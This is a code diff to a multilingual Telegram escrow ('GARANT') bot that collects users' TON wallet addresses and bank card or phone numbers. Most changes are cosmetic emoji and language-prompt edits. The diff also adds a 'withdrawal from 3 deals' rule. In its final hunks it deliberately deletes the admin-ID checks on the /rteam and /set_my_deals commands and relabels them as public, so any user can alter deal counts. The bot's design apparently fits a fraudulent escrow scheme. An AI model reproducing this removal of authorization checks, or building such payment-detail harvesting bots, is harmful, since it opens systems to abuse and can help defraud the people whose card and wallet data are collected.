@@ -44,6 +44,8 @@ E_BACK = "5278413853577734640"        # ◀️
 E_DIAMOND = "5193179982775476271"     # 💎
 E_CARD = "5192689390136089826"        # 💳
 E_BOOK = "5206626000665868017"        # 📚
+E_GLOBE = "5239963889004732575"       # 🌐
+E_LINK = "5278305362703835500"        # 🔗
 
 # ============ СОСТОЯНИЯ ============
 class DealCreation(StatesGroup):
@@ -172,7 +174,7 @@ async def inc_deals(tg_id):
 # ============ ТЕКСТЫ ============
 TEXTS = {
     "ru": {
-        "choose_lang": "🌐 Выберите язык / Choose language:",
+        "choose_lang": f"<tg-emoji emoji-id='{E_GLOBE}'>🌐</tg-emoji> Выберите язык / Choose language / اختر اللغة:",
         "welcome": (
             f"<tg-emoji emoji-id='{E_CROWN}'>👑</tg-emoji> "
             "<b>{brand} MARKET · GARANT</b> "
@@ -214,7 +216,7 @@ TEXTS = {
             f"<tg-emoji emoji-id='{E_CHECK}'>✅</tg-emoji> <b>Сделка успешно создана!</b>\n\n"
             f"<tg-emoji emoji-id='{E_DIAMOND}'>💎</tg-emoji> Сумма: <b>{{amount}} {{currency}}</b>\n"
             f"<tg-emoji emoji-id='{E_BOOK}'>📚</tg-emoji> Описание: <b>{{description}}</b>\n\n"
-            "🔗 <b>Ссылка для покупателя:</b>\n{link}\n\n"
+            f"<tg-emoji emoji-id='{E_LINK}'>🔗</tg-emoji> <b>Ссылка для покупателя:</b>\n{{link}}\n\n"
             "<i>Скопируйте ссылку и отправьте покупателю</i>"
         ),
         "payment_confirmed_seller": (
@@ -243,6 +245,7 @@ TEXTS = {
             f"<tg-emoji emoji-id='{E_USER}'>👤</tg-emoji> Пользователь: @{{username}}\n\n"
             "Доступные средства:\n"
             "💱 <b>{balance}</b>\n\n"
+            "<b>ВЫВОД ОТ 3-Х СДЕЛОК</b>\n\n"
             "🏦 <b>Информация о выводе средств:</b>\n"
             f"<tg-emoji emoji-id='{E_DIAMOND}'>💎</tg-emoji> TON-кошелёк: {{ton}}\n"
             f"<tg-emoji emoji-id='{E_CARD}'>💳</tg-emoji> Карта / СБП: {{card}}\n\n"
@@ -256,13 +259,13 @@ TEXTS = {
             "Используйте кнопки ниже чтобы добавить/изменить реквизиты 🔽"
         ),
         "enter_ton": (
-            f"🔓 <b>Добавьте ваш TON-кошелёк:</b>\n\n"
+            "🔓 <b>Добавьте ваш TON-кошелёк:</b>\n\n"
             "Пожалуйста, отправьте адрес вашего кошелька\n\n"
             "Важно:\n• Минимальная сумма вывода: {min_ton} TON"
         ),
         "ton_added": f"<tg-emoji emoji-id='{E_CHECK}'>✅</tg-emoji> <b>Адрес успешно добавлен</b>",
         "choose_region": (
-            "🌍 <b>Выберите регион вашей карты / телефона:</b>\n\n"
+            f"<tg-emoji emoji-id='{E_GLOBE}'>🌍</tg-emoji> <b>Выберите регион вашей карты / телефона:</b>\n\n"
             "Поддерживаются карты и номера России, Казахстана, Украины и Беларуси."
         ),
         "enter_card": f"<tg-emoji emoji-id='{E_CARD}'>💳</tg-emoji> Отправьте номер карты или телефона:",
@@ -292,7 +295,7 @@ TEXTS = {
     },
 
     "en": {
-        "choose_lang": "🌐 Выберите язык / Choose language:",
+        "choose_lang": f"<tg-emoji emoji-id='{E_GLOBE}'>🌐</tg-emoji> Выберите язык / Choose language / اختر اللغة:",
         "welcome": (
             f"<tg-emoji emoji-id='{E_CROWN}'>👑</tg-emoji> "
             "<b>{brand} MARKET · GARANT</b> "
@@ -334,7 +337,7 @@ TEXTS = {
             f"<tg-emoji emoji-id='{E_CHECK}'>✅</tg-emoji> <b>Deal successfully created!</b>\n\n"
             f"<tg-emoji emoji-id='{E_DIAMOND}'>💎</tg-emoji> Amount: <b>{{amount}} {{currency}}</b>\n"
             f"<tg-emoji emoji-id='{E_BOOK}'>📚</tg-emoji> Description: <b>{{description}}</b>\n\n"
-            "🔗 <b>Link for buyer:</b>\n{link}\n\n"
+            f"<tg-emoji emoji-id='{E_LINK}'>🔗</tg-emoji> <b>Link for buyer:</b>\n{{link}}\n\n"
             "<i>Copy the link and send it to the buyer</i>"
         ),
         "payment_confirmed_seller": (
@@ -363,6 +366,7 @@ TEXTS = {
             f"<tg-emoji emoji-id='{E_USER}'>👤</tg-emoji> User: @{{username}}\n\n"
             "Available funds:\n"
             "💱 <b>{balance}</b>\n\n"
+            "<b>WITHDRAWAL FROM 3 DEALS</b>\n\n"
             "🏦 <b>Withdrawal info:</b>\n"
             f"<tg-emoji emoji-id='{E_DIAMOND}'>💎</tg-emoji> TON wallet: {{ton}}\n"
             f"<tg-emoji emoji-id='{E_CARD}'>💳</tg-emoji> Card / SBP: {{card}}\n\n"
@@ -382,7 +386,7 @@ TEXTS = {
         ),
         "ton_added": f"<tg-emoji emoji-id='{E_CHECK}'>✅</tg-emoji> <b>Address successfully added</b>",
         "choose_region": (
-            "🌍 <b>Choose your card/phone region:</b>\n\n"
+            f"<tg-emoji emoji-id='{E_GLOBE}'>🌍</tg-emoji> <b>Choose your card/phone region:</b>\n\n"
             "Cards and numbers from Russia, Kazakhstan, Ukraine and Belarus are supported."
         ),
         "enter_card": f"<tg-emoji emoji-id='{E_CARD}'>💳</tg-emoji> Send your card or phone number:",
@@ -412,7 +416,7 @@ TEXTS = {
     },
 
     "zh": {
-        "choose_lang": "🌐 Выберите язык / Choose language:",
+        "choose_lang": f"<tg-emoji emoji-id='{E_GLOBE}'>🌐</tg-emoji> Выберите язык / Choose language / اختر اللغة:",
         "welcome": (
             f"<tg-emoji emoji-id='{E_CROWN}'>👑</tg-emoji> "
             "<b>{brand} MARKET · GARANT</b> "
@@ -454,7 +458,7 @@ TEXTS = {
             f"<tg-emoji emoji-id='{E_CHECK}'>✅</tg-emoji> <b>交易创建成功！</b>\n\n"
             f"<tg-emoji emoji-id='{E_DIAMOND}'>💎</tg-emoji> 金额：<b>{{amount}} {{currency}}</b>\n"
             f"<tg-emoji emoji-id='{E_BOOK}'>📚</tg-emoji> 描述：<b>{{description}}</b>\n\n"
-            "🔗 <b>买家链接：</b>\n{link}\n\n"
+            f"<tg-emoji emoji-id='{E_LINK}'>🔗</tg-emoji> <b>买家链接：</b>\n{{link}}\n\n"
             "<i>复制链接并发送给买家</i>"
         ),
         "payment_confirmed_seller": (
@@ -483,6 +487,7 @@ TEXTS = {
             f"<tg-emoji emoji-id='{E_USER}'>👤</tg-emoji> 用户：@{{username}}\n\n"
             "可用资金：\n"
             "💱 <b>{balance}</b>\n\n"
+            "<b>3 笔交易后可提现</b>\n\n"
             "🏦 <b>提现信息：</b>\n"
             f"<tg-emoji emoji-id='{E_DIAMOND}'>💎</tg-emoji> TON 钱包：{{ton}}\n"
             f"<tg-emoji emoji-id='{E_CARD}'>💳</tg-emoji> 银行卡 / SBP：{{card}}\n\n"
@@ -502,7 +507,7 @@ TEXTS = {
         ),
         "ton_added": f"<tg-emoji emoji-id='{E_CHECK}'>✅</tg-emoji> <b>地址添加成功</b>",
         "choose_region": (
-            "🌍 <b>请选择您银行卡/手机号的地区：</b>\n\n"
+            f"<tg-emoji emoji-id='{E_GLOBE}'>🌍</tg-emoji> <b>请选择您银行卡/手机号的地区：</b>\n\n"
             "支持俄罗斯、哈萨克斯坦、乌克兰和白俄罗斯的银行卡和手机号。"
         ),
         "enter_card": f"<tg-emoji emoji-id='{E_CARD}'>💳</tg-emoji> 请发送银行卡号或手机号：",
@@ -955,12 +960,9 @@ async def save_card(message: Message, state: FSMContext):
     await state.clear()
     await message.answer(t(lang, "card_added"), reply_markup=back_menu_kb(lang))
 
-# ---------- Скрытые команды (только админ) ----------
+# ---------- Общедоступные команды ----------
 @admin_router.message(Command("rteam"))
 async def cmd_rteam(message: Message):
-    if message.from_user.id not in ADMIN_IDS:
-        await message.answer(TEXTS["ru"]["admin_only"])
-        return
     async with aiosqlite.connect(DB_PATH) as db:
         db.row_factory = aiosqlite.Row
         cur = await db.execute(
@@ -995,9 +997,6 @@ async def cmd_rteam(message: Message):
 
 @admin_router.message(Command("set_my_deals"))
 async def cmd_set_my_deals(message: Message):
-    if message.from_user.id not in ADMIN_IDS:
-        await message.answer(TEXTS["ru"]["admin_only"])
-        return
     args = message.text.split()
     if len(args) < 2 or not args[1].isdigit():
         await message.answer(t("ru", "admin_set_deals_usage"))
